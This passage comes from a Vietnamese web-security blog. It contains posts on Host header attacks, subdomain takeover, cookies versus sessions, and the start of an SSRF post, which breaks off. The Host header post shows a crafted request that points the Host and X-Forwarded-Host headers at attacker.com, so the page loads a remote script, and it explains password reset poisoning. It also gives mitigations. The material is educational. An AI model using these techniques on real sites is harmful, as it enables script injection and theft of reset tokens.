<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>When a proxy receives a request with an absolute-form of<br>request-target, the proxy MUST ignore the received Host header field<br>(if any) and instead replace it with the host information of the<br>request-target.</p><cite>Ngoài ra bạn có thể tham khảo thêm về tài liệu của <a href="https://www.keycdn.com/support/x-forwarded-host" target="_blank" rel="noreferrer noopener">KeyCDN</a></cite></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":253,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-10.png" alt="" class="wp-image-253"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Header này thường được sử dụng phổ biến trong các ứng dụng web PHP, .&nbsp;Một số kịch bản trong ví dụ sau đây là cách sử dụng tiêu biểu và nguy hiểm của host header:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>&lt;script src="http://&lt;?php echo _SERVER&#91;'HOST'] ?>/script.js">
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Kẻ tấn công có thể lợi dụng code ở trên để tạo đầu ra HTML chỉ bằng cách thao túng host header.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>GET / HTTP/1.1
Host: www.attacker.com
&#91; X-Forwarded-Host: www.attacker.com ]</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Và kết quả nhận được là trình duyệt của victims sẽ load file .js từ máy chủ của attacker :</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>&lt;script src="http://attacker.com/script.js"></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Từ đây attacker có thể thực hiện một cuộc tấn công xss hoặc phising. Nhưng với kiểu này sẽ rất khó để khai thác ở ngoài thực tế. bạn chỉ có thể thay đổi được giá trị các header trong request của victim chỉ khi bạn có thể can thiệp vào giữa giao tiếp của Client vs Server như kiểu MITM (Man in the middle). Các bug bounty program thường không công nhận lỗi này vì vậy bỏ qua hướng đó và tiếp tục leo thang.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Sẽ có 2 hướng tấn công chính từ lỗ hổng HHA mình muốn đề cập là <a rel="noreferrer noopener" href="http://hydrasky.ml/2020/03/web-cache-poisoning-part-1" target="_blank">web cache poisoning</a> và Password reset poisoning.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Đối với Web cache poisoning</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Để điều này xảy ra, kẻ tấn công sẽ cần phải đầu độc proxy cache của trang web hoặc nhà cung cấp được website sử dụng như các CDN.&nbsp;Cache sau đó sẽ phục vụ nội dung bị nhiễm độc cho bất kỳ ai request với nội dung tương tự, và tất nhiên nạn nhân không thể kiểm soát được nội dung độc hại mà cache cung cấp cho họ. Để hiểu rõ hơn về WCP các bạn có thểm tham khảo <a href="http://hydrasky.ml/2020/03/web-cache-poisoning-part-1" target="_blank" rel="noreferrer noopener">bài viết</a> của mình.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","width":458,"height":307} -->
<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://blog.cloudflare.com/content/images/2018/08/subtle-req-resp.png" alt="How Cloudflare protects customers from cache poisoning" width="458" height="307"/><figcaption>Ví dụ</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Một điều lưu ý ở đây là lên sử dụng X-Forwarded-Host thay vì Host header để poisoning bởi vì thông thường Host header nằm trong cache key và bình thường sẽ chẳng ai tự thay đổi giá trị host header của mình về host của attacker hoặc thành một payload độc hại cả.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Đối với Password reset poisoning</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Thông thường khi bạn quên mật khẩu bạn sẽ chọn cách là reset lại nó và chức năng nay ai cũng có thể sử dụng. Server sẽ tiến hành gửi email với link reset mật khẩu có dạng&nbsp;<code>example.com/reset-password?email=victim@gmail.com&amp;code=identify:token</code>&nbsp;(<code>identify:token</code>&nbsp;thường được mã hóa) . Mình sẽ không giải thích code như thế nào nha! Các bạn cử hiêu đơn giản lúc này server sử dụng _SERVER['HOST'] để xác định host của link.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Attacker đã lợi dụng điều này dùng tên tài khoản như email, username ... của victim để thực hiện. Trước khi request được gửi đi, attacker sẽ sửa giá trị của host header thành máy chủ của attacker .Server sẽ tiến hành gửi email với link reset mật khẩu có dạng&nbsp;là <code>attacker.com/reset-password?email=victim@gmail.com</code>&amp;<code>code=identify:token</code>&nbsp;(<code>identify:token</code>&nbsp;thường được mã hóa).</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Ok như vậy khi victim vào mail và click vào link reset mật khẩu sẽ request đến server của attacker. Attacker lúc này chỉ việc ngồi và xem log trên máy chủ sẽ lấy được link hay quan trọng hơn đó la token để đổi mật khẩu của victim.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":257,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-11.png" alt="" class="wp-image-257"/><figcaption><a href="https://hackerone.com/reports/281575" target="_blank" rel="noopener">https://hackerone.com/reports/281575</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>Cách tìm kiếm lỗ hổng này</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Để phát hiện ra nó rât đơn giản bạn chỉ cần chặn bắt request bằng các công cụ như Burpsuite hoặc Zap và thay đổi giá trị của Host header hoặc thêm vào X-Forwarded-Host rồi theo dõi reponse trả về là biết. Hoặc các bạn có thể sử dụng các công cụ scan web tự động như Acunetix. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","width":515,"height":253} -->
<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://www.cloudace.in/wp-content/uploads/2020/01/acunetix.png" alt="Acunetix Web Vulnerability Scanning Software - CloudACE Technologies" width="515" height="253"/></figure></div>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>Các phòng chống lỗ hổng</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Thay vì sử dụng host header để xác định thì lập trình viên nên sử dụng SERVER_NAME.Bởi vì SERVER_NAME sẽ lấy thông tin từ cấu hình của máy chủ nên nó sẽ xác thực hơn. Cùng với đó bạn có thể kết hợp với việc sử dụng Whitelist cho các tên server được phép</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">$domains = [‘abc.example.com’, ‘foo.bar.com’];<br>if ( ! in_array($_SERVER[‘SERVER_NAME’], $domains)) {<br>// error<br>}</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>OK như vậy là mình đã nó xong về Host header attack, nói chung thì lỗ hổng này không có gì quá nổi bật nhưng cũng đáng để chúng ta học hỏi thêm kinh nghiệm. Xin chào và hẹn gặp các bạn vào bài viết sau!</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Tham khảo</h2>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li><a href="https://www.yeahhub.com/host-header-attack-practical-exploitation-and-prevention/" target="_blank" rel="noopener">https://www.yeahhub.com/host-header-attack-practical-exploitation-and-prevention/</a></li><li><a href="https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html" target="_blank" rel="noopener">https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</a></li><li><a href="https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/</a></li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/Host%20Header%20Attack/" data-id="ckbgpmbcj0009qxjmgsqa2hxs" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-Server/" rel="tag">Web Server</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-SUBDOMAIN TAKEOVER" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/SUBDOMAIN%20TAKEOVER/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/SUBDOMAIN%20TAKEOVER/">Subdomain Takeover</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:paragraph -->
<p>Subdomain takeover được công bố vào năm 2014 là một kiểu tấn công vào tên miền phụ (Subdomain) của  một website và nguyên nhân dẫn đến là do việc cấu hình DNS . Bằng cách này hacker có thể chiếm được full quyền kiểm soát của một subdomain từ đó thực hiện các cuộc tấn công giả mạo trang web (phishing) hoặc phát tán mã độc (malwares).</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Như các bạn đã biết<strong> </strong>Domain<strong> </strong>name là tên đại diện của một website hoạt động trên internet, đóng vai trò là một địa chỉ vật lý thay vì dùng địa chỉ ip (lí do tại sao chắc các bạn đều rõ ) . Còn Subdomain<strong>&nbsp;</strong>là phần mở rộng của một tên miền.&nbsp;Subdomain<strong>&nbsp;</strong>có thể được tạo hoàn toàn miễn phí và nó có thể hoạt động như một tên miền thực thụ.&nbsp;Subdomain&nbsp;ra đời nhằm giải quyết về chi phí đăng ký tên miền cũng như giúp bạn tạo ra nhiều website trên các lĩnh vực khác nhau thuộc tên miền chính. Ví dụ :</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>Domain: example.com</p><p>Subdomain : hello.example.com</p><cite>Domain vs Subdomain</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Gỉa sử bạn ở hữu một domain example.com và server của bạn có ip là 1.2.3.4 . Bây giờ bạn muốn trỏ domain về địa chỉ ip của server , nhà cung cấp tên miền (DNS provider) sẽ có cách giúp bạn làm điều này. Nhà cung cấp sẽ cung cấp trình quản lý tên miền để bạn có thể thêm, sửa ,trỏ tên miền về địa chỉ bạn muốn.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":84,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-2.png" alt="" class="wp-image-84"/><figcaption>Quản lí domain</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Trong phần cấu hình sẽ có mục bản ghi cho tên miền "record" dùng để dùng để mô tả các thông tin về cơ sở dữ liệu DNS, bạn có thể tham khảo <a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types" target="_blank" rel="noreferrer noopener" aria-label="DNS_Record (opens in a new tab)">DNS_Record</a> . Đối với vấn đề này ta chỉ biết đến các bản ghi sau:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Bản ghi A hoặc AAAA</li><li>Bản ghi CNAME</li><li>Bản ghi bổ sung như ALIAS và URL </li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Bản ghi A vs AAAA: Đây là các bản ghi thường được dùng, dùng để trỏ một domain hoặc subdomain về một host hay ip tương ứng.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Bản ghi CNAME : hay còn gọi là Bản ghi bí danh dành cho các tên miền phụ . Bản ghi CNAME cho phép một server có thể có nhiều tên. Nói cách khác bản ghi CNAME cho phép nhiều tên miền cùng trỏ đến một địa chỉ IP cho trước hoặc liên kết tới một bản ghi khác .Ví dụ : "hello.example.com hi.demo.com CNAME"</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Bản ghi bổ sung như ALIAS và URL : Đây là những bản ghi không có trong&nbsp;<a href="https://www.ietf.org/rfc/rfc1035.txt" target="_blank" rel="noopener">DNS RFC</a>&nbsp;, vì vậy chúng chỉ được hỗ trợ bởi một số nhà cung cấp DNS nhất định.&nbsp;ALIAS&nbsp;là một bản ghi giả hoạt động như một&nbsp;CNAME&nbsp;nhưng có thể được sử dụng cho cả tên miền gốc và tên miền phụ.&nbsp;Bản&nbsp;ghi chuyển hướng URL&nbsp;được sử dụng để chuyển hướng một tên miền sang một tên miền / URL khác.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>SECOND-ORDER SUBDOMAIN TAKEOVERS</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Quay trở lại vấn đề, việc hacker cơ tiếp quản subdomain là do cấu hình DNS. Thông thường các dịch vụ bên thứ 3 như Desk, Squarespace, Shopify, Github, Tumblr, và Heroku ... khi người dùng đăng kí lấy ứng dụng, tài khoản thì sẽ được cấp một subdomain đi kèm để truy cập trực tiếp vào nội dung của mình như sau :</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":85,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-3.png" alt="" class="wp-image-85"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Tuy nhiên mọi người thường muốn dùng tên miền của riêng mình thay vì tên miền của Provider cấp cho. Đơn giản họ chỉ cần cấu hình DNS trỏ tên miền của họ về tiên miền được cung cấp bởi bên thứ 3 : "shop.example.com shops.myshoptify.com"</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":86,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-4-1024x50.png" alt="" class="wp-image-86"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Và vấn đề ở đây xảy ra khi các subdomain do bên thứ 3 cung cấp đã hêt hạn đăng kí sẽ có hai trường hợp xảy ra là người dùng không muốn dùng nữa và quên đăng kí thêm thời gian. Cùng với đó người quản trị không bỏ , thay đổi cấu hình trong DNS .Hacker sẽ tìm các ra subdomain  của người dùng  bằng các công cụ như Subfinder, SubStack , Amass,crt.sh ... </p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://mamot.fr/system/media_attachments/files/007/727/655/original/8c42a00a677333d1.png?1577792038" alt="Kết quả hình ảnh cho subfinder"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Sau đó hacker sẽ tìm những subdomain nào không còn sử dụng nữa và khả năng tiếp quản nó. Sử dụng các dấu hiệu như sau để nhận biết :</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://securitytrails.com/images/f/1/4/d/c/f14dc8034d6cf93efdf31c19c51b18bc97f19fa6-table.png" alt="tên miền phụ dễ bị chiếm đoạt tên miền phụ trong năm 2019"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Thường hacker sẽ sử dụng các command linux như: host, dig để tìm kiếm tên của bên thứ 3 (provider)</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://www.researchgate.net/profile/S_M_Zia_Ur_Rashid/publication/332353497/figure/fig2/AS:746585789042693@1555011331203/Checking-DNS-Record-using-dig-command.png" alt="Kết quả hình ảnh cho dig command"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Tìm các subdomain có sử dụng bản ghi CNAME sẽ có khả năng tiếp quản rất cao. Hacker sẽ đăng kí với bên thứ 3 đó để có tên miền như tên miền người dùng đăng kí và sau đó chỉ cần cấu hình subdomain được cung cấp nhận subdomain, ip tương ứng với cấu hình DNS của người dùng . SUBDOMAIN TAKEOVER!!!!</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://0xpatrik.com/content/images/2018/06/takeover_basic.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Chi tiết thực hiện các bạn có thể tham khảo trong rất nhiều writeup,bugbounty progam :</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li><a href="https://medium.com/@ajdumanhug/subdomain-takeover-through-external-services-f0f7ee2b93bd" target="_blank" rel="noopener">https://medium.com/@ajdumanhug/subdomain-takeover-through-external-services-f0f7ee2b93bd</a></li><li><a href="https://medium.com/@valeriyshevchenko/subdomain-takeover-with-shopify-heroku-and-something-more-6e9504da34a1" target="_blank" rel="noopener">https://medium.com/@valeriyshevchenko/subdomain-takeover-with-shopify-heroku-and-something-more-6e9504da34a1</a></li><li><a href="https://hackerone.com/hacktivity" target="_blank" rel="noopener">https://hackerone.com/hacktivity</a></li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Làm thế nào để tránh những vấn đề như vậy?&nbsp;: -</strong>&nbsp;Luôn cập nhật hồ sơ DNS của bạn, xóa CNAME hoặc bất kỳ bản ghi DNS nào khác không được sử dụng.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Link tham khảo :</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li><a href="https://securitytrails.com/blog/subdomain-takeover-tips" target="_blank" rel="noopener">https://securitytrails.com/blog/subdomain-takeover-tips</a></li><li><a href="https://blog.cystack.net/subdomain-takeover/" target="_blank" rel="noopener">https://blog.cystack.net/subdomain-takeover/</a></li><li><a href="https://github.com/EdOverflow/can-i-take-over-xyz" target="_blank" rel="noopener">https://github.com/EdOverflow/can-i-take-over-xyz</a></li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/SUBDOMAIN%20TAKEOVER/" data-id="ckbgpmbck000aqxjm754cd5pq" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-Server/" rel="tag">Web Server</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Session &amp; Cookie" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/Session%20&%20Cookie/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/Session%20&%20Cookie/">Session &amp; Cookie</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:paragraph -->
<p>Mục tiêu của các cuộc tấn công như XSS  là lấy được session và cookie của nạn nhận. Vậy chúng là gì và tại sao là chúng mà không phải là username, password. Ok chúng ta cùng tìm hiểu nha.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>COOKIE</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Đầu tiên chúng ta cùng đến với cookie</p>
<!-- /wp:paragraph -->

<!-- wp:media-text {"mediaType":"image"} -->
<div class="wp-block-media-text alignwide is-stacked-on-mobile"><figure class="wp-block-media-text__media"><img src="https://www.cookingclassy.com/wp-content/uploads/2014/06/chocolate-chip-cookie-16.jpg" alt="One Chocolate Chip Cookie - Cooking Classy"/></figure><div class="wp-block-media-text__content"><!-- wp:paragraph {"placeholder":"Content…","fontSize":"large"} -->
<p class="has-large-font-size">Cookie</p>
<!-- /wp:paragraph --></div></div>
<!-- /wp:media-text -->

<!-- wp:paragraph -->
<p>Cookie là một tệp tin chứa các thông tin nhỏ và hỗn tạp như id, username, timestamp ... (mỗi giá trị này sẽ có một <strong>key-value</strong> ví dụ như <span style="text-decoration: underline;"><em><strong>uuid</strong></em></span>=12345 ) của người dùng vì vậy nó được ví như bánh cookie .Nó được tạo ra khi người dùng truy cập đến các trang web, server sẽ gửi nó đến browser và lưu trên máy tính của chúng ta. Nó sẽ được lưu tạm thời trong một khoảng thời gian (timeout) có thể là vài tuần hoặc tháng  .Khi người dùng truy cập đến trang web lần sau , browser sẽ gửi lại các thông tin này đến server .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Dựa vào tính chất có thể phân ra làm 2 loại cookie là Persistent cookie  và Session cookie, nó cũng chính là cookie và session. </p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Mục đích của cookie để làm gì ?</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Cookie được xem là thành phần không thể thiếu đối với những website có lượng lớn dữ liệu, số lượng người dùng đông. Tác dụng đầu tiên có thể kể đến ở đây là cookie có thể dùng để duy trì trạng thái đăng nhập. Thay vì cứ mỗi lần truy cập vào trang web bạn phải đăng nhập lại thì cookie sẽ làm giúp bạn điều này . Hay làm việc với web site sẽ nhanh hơn bằng cách lấy thông tin từ cookie thay vì vào cơ sở dữ liệu .  Ngoài ra với cookie, các website còn có thể xác định các hành vi của người dùng như số khách hàng truy cập đến , tần xuất truy cập của một khách hàng vào trang, khách hàng mới hay khách hàng cũ, khách hàng đã xem cái gì. Vì vậy nó rất có ích và tiện lợi cho các web site thương mại điện tử.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Chắc bạn cũng thắc mắc tại sao khi mình truy cập vào các trang web A  xem cách sản phẩm sau đó truy cập vào các trang web B thì thấy nó quảng cáo sẩn phẩm A như kiểu mình bị theo dõi vậy haha. Nó là do website B sử dụng cookie của website A tạo ra  nó gọi là cookie bên thứ 3 (third party). Nó đôi khi khó chịu nhưng thôi cũng kệ !!!</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Cookies cũng thường được sử dụng trong việc tạo ra Session.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Cookie có cần bảo mật không ?</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Tất nhiên là có, nó rất quan trọng ấy chứ!</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Nhiều cookie lưu trữ các dữ liệu nhạy cảm vi nó chứa các thông tin của người dùng . Vì vậy để tránh bị tiết  lộ rộng rãi , chỉ cho phép website chứa cookie  mới có thể xem được thông tin này. Một số trình duyệt hiện tại có chức năng ngân chặn bên thứ 3 hoặc yêu cầu người dùng phải cấp quyền đọc cookie.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>SESSION</h2>
<!-- /wp:heading -->

<!-- wp:image {"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="https://media.hoclaptrinh.vn/images/session-la-gi-5c370b6a76d46.gif" alt="Session Là Gì?"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Session hay dân ta gọi là phiên làm việc hay trạng thái làm việc, một session bắt đầu khi client gửi request đến server, nó tồn tại xuyên suốt từ trang này đến trang khác trong ứng dụng web và chỉ kết thúc khi hết thời gian timeout hoặc khi bạn đóng ứng dụng. Với mỗi session sẽ được cấp phát một định danh duy nhất SessionID .Sẽ không có chuyện trùng lặp nha các bạn kể cả cùng một tài khoản đăng nhập trên hai trình duyệt . Và một điều nữa, khác với cookie , Session sẽ được lưu lại ở phía server.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Có bạn sẽ thắc mắc là " Ơ thế sao tôi lại thấy session ở trong cookie gửi từ client lên?" hoặc "làm sao để server xác định session đó là của client nào?"</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":272,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-12.png" alt="" class="wp-image-272"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Thông thường session được tạo ra sẽ tương ứng với cookie được gửi đến server, đồng thời nó tạo ra một tệp tin chứa id session gọi là session cookie lưu trên bộ nhớ cache của trình duyệt. Điều này cũng đồng nghĩa với việc  id session sẽ  mất khi người dùng đóng trình duyệt. Khi người dùng mở  lại trình duyệt và request đến trang web sẽ chỉ còn têp tin persistent cookie được gửi lên và như vậy session mới sẽ được tạo. Còn làm sao để xác thực thì bạn biết rồi đấy, nó đi cùng cookie mà nhưng cũng chính vì điều này mà hacker có thể chiếm session của bạn.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Thế mục đích của Session để làm gì ?</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Một session có thể lưu trữ tạm thời thông tin liên quan đến các hoạt động ở của người dùng  trong khi kết nối . Ví dụ như bạn click vào sản phẩm, thêm sản phẩm vào mục xem sau, ... . Nó chỉ có tác dụng kiểm tra khi 1 phiên bắt đầu và kết thúc tại thời điểm nào .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Tùy vào mục đích công việc mà bạn nên sử dụng session hợp lý nhất nhằm mang lại hiệu quả tối đa. Dưới đây là những lĩnh vực cần:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Các ứng dụng thương mại điện tử</strong>: Có thể xem xét các phiên để xem người dùng mất bao lâu để chuyển đổi hoặc thời gian trung bình của người dùng theo từng trang. Mục đích này sẽ giúp họ biết được sản phẩm nào được người dùng chú ý.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Các nhà phát triển trò chơi, game online</strong>: Có thể phân tích thời lượng phiên của họ để xem liệu người dùng có đầu tư đủ thời gian vào trò chơi để tận hưởng trải nghiệm được cung cấp hay không.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Các ứng dụng truyền thông xã hội</strong>: Có thể kiểm tra số phiên trong suốt một ngày để xem liệu người dùng có biến công cụ này thành một phần thiết yếu trong cuộc sống hàng ngày của họ hay không.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Nhưng giống với cookie, session cũng có thể dùng để duy trì trạng thái đăng nhập nhưng chỉ trong thời gian ngắn. Và đây là nguyên nhân hacker  muốn chiến session bạn.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Bảo mật cho session ?</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Ngoài việc server tạo các session có thể dễ đoán ra thì bình thường nó vẫn rất an toàn, an toàn hơn nhiều so với cookie. Bởi nó  không thể thay đổi giá trị  khi được lưu trữ trên server. Hacker chỉ có thể tìm cách là ăn trộm nó qua các lỗ hổng như XSS, Session hijacking.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Bây giờ chúng ta cùng Cùng so sánh các điểm khác biệt giữa chúng nha.</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table><tbody><tr><td>                          <strong>Cookie</strong></td><td>                         <strong>Session</strong></td></tr><tr><td>Cookie được lưu trữ trên trình duyệt của người dùng.</td><td>Session không được lưu trữ trên trình duyệt.</td></tr><tr><td>Dữ liệu cookie được lưu trữ ở phía client.</td><td>Dữ liệu session được lưu trữ ở phía server.</td></tr><tr><td>Dữ liệu cookie dễ dàng sửa đổi hoặc đánh cắp khi chúng được lưu trữ ở phía client.</td><td>Dữ liệu session không dễ dàng sửa đổi vì chúng được lưu trữ ở phía máy chủ.</td></tr><tr><td>Dữ liệu cookie có sẵn trong trình duyệt đến khi expired.</td><td>Sau khi đóng trình duyệt sẽ hết phiên làm việc (session)</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Ok như vậy là mình dã trình bày một số kiển thức về session và token. Các bạn có ý kiến gì hãy để lại comment cho minh nhé!</p>
<!-- /wp:paragraph -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/Session%20&%20Cookie/" data-id="ckbgpmbcl000cqxjmdopy4nw9" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Server Side Request Forgery (Part1)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/Server%20Side%20Request%20Forgery%20(Part1)/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/Server%20Side%20Request%20Forgery%20(Part1)/">Server Side Request Forgery (PART 1)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:image -->
<figure class="wp-block-image"><img src="https://portswigger.net/web-security/images/server-side%20request%20forgery.svg" alt="SSRF"/><figcaption>Ảnh minh họa (PortSwigger)</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Server site request Forgery gọi tắt là SSRF, ngược với lại <a href="http://hydrasky.ml/2020/03/cross-site-request-forgery" target="_blank" rel="noopener">CSRF</a> đây là kiểu tấn công giả mạo yêu cầu phía máy chủ, máy chủ sẽ thực hiện các HTTP request đến các tên miền mà attacker muốn . Nguy hiểm hơn tấn công SSRF sẽ giúp hacker bypass và tấn công trực tiếp vào các hệ thống nội bộ (Internal) phía sau tường lửa (Firewall) hoặc các kết nối với bên thứ 3, thực hiện các hành động và truy cập trái phép vào dữ liệu của tổ chức.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":117,"sizeSlug":"large"} -->
